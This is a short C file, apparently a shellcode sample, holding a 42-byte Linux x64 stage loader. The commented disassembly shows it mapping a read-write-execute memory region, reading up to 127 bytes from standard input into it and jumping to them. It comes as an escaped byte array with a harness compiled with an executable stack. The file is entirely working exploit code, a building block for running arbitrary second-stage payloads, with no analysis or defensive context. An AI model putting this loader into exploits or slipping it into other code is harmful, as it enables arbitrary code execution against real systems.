#include <stdio.h>
/*

load 0x7f bytes from stdin then jmp --  42 Bytes -- 8NOV2017 -- icon
test with: gcc -o test -z execstack linux_x64_stdin_loader.c

0:  48 31 c0                xor    rax,rax
3:  48 89 c7                mov    rdi,rax
6:  49 89 c1                mov    r9,rax
9:  49 89 c0                mov    r8,rax
c:  49 83 e8 01             sub    r8,0x1
10: b0 09                   mov    al,0x9
12: 6a 7f                   push   0x7f
14: 5e                      pop    rsi
15: 6a 07                   push   0x7
17: 5a                      pop    rdx
18: 6a 22                   push   0x22
1a: 41 5a                   pop    r10
1c: 0f 05                   syscall
1e: 50                      push   rax
1f: 48 31 c0                xor    rax,rax
22: 48 89 f2                mov    rdx,rsi
25: 5e                      pop    rsi
26: 0f 05                   syscall
28: ff e6                   jmp    rsi

*/

char loader[] = \
"\x48\x31\xC0\x48\x89\xC7\x49\x89\xC1\x49\x89\xC0\x49\x83"
"\xE8\x01\xB0\x09\x6A\x7F\x5E\x6A\x07\x5A\x6A\x22\x41\x5A"
"\x0F\x05\x50\x48\x31\xC0\x48\x89\xF2\x5E\x0F\x05\xFF\xE6";


int main(int argc, char **argv){
  int (*test)() = (int(*)())loader;
  test();
}
